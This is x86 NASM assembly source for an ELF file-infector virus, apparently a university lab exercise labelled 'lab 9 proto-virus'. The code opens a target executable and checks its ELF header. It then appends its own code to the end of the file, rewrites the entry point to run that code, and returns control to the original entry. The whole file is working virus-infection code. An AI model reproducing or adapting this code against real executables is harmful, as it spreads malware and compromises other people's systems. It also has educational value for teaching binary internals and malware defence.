%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES           
	;CODE START
	open_file:
		call get_my_loc		
		sub ecx, next_i-FileName
		mov eax, ecx
		open eax, RDWR, 0777	
		cmp eax, -1		
		jle	fail						
		
		mov edi, eax					
	check_magic_numbers:
		read edi, ebp, 4
		cmp eax, -1					
		mov ecx, ebp
		jle	fail					
		cmp dword[ecx], 0x464C457F
		jne fail
	check_ET_EXEC_file:
		lseek edi, 0x10, SEEK_SET
		read edi, ebp, 4
		cmp eax, -1					
		mov ecx, ebp
		jle	fail					
		cmp dword[ecx], 0x00030002
		jne fail
	
	save_previous_entry:
		lseek edi, 0x18, SEEK_SET
		cmp eax, -1					
		jle	fail					

		read edi, previous_entry_point, 4
		cmp eax, -1					
		jle	fail
	infect_file:
		; go to the end of the file
		lseek edi, 0, SEEK_END
		cmp eax, -1						
		jle	fail						
		mov esi, eax				
		write edi, infect_from_here, virus_end - infect_from_here
		cmp eax, -1				
		jle	fail				

	get_virtual_address:
		lseek edi, 0x3C, SEEK_SET		
		cmp eax, -1				
		jle	fail				
		read edi, ebp, 4
		cmp eax, -1				
		mov ecx, ebp
		jle	fail				
		add esi, dword[ecx]
		mov dword[new_entry_point], esi
	change_entry_point:
		lseek edi, 0x18, SEEK_SET
		cmp eax, -1				
		jle	fail				
		
		write edi, new_entry_point, 4
		cmp eax, -1				
		jle	fail				
		write 1, OutStr, 31
	set_prev_entry_point:
		lseek edi, -4, SEEK_END
		cmp eax, -1				
		jle	fail				
		break_here:
		write edi, previous_entry_point, 4
		cmp eax, -1				
		jle	fail				
		jmp VirusExit
		
infect_from_here:
	print_sucess:
		call get_my_loc				
		sub ecx, next_i-OutStr
		write 1, ecx, 31
	
	get_back_to_old_entry_point:
		call get_my_loc
		sub ecx, next_i-PreviousEntryPoint
		jmp [ecx]

	;fail
	fail:
		call get_my_loc				
		sub ecx, next_i-Failstr
		write 2, ecx, 12

VirusExit:
	   close edi
       exit 0            
                         


FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
works_string: db "it works!", 10, 0
	
get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:




section .bss
var: resd 1
previous_entry_point: resd 1
new_entry_point: resd 1
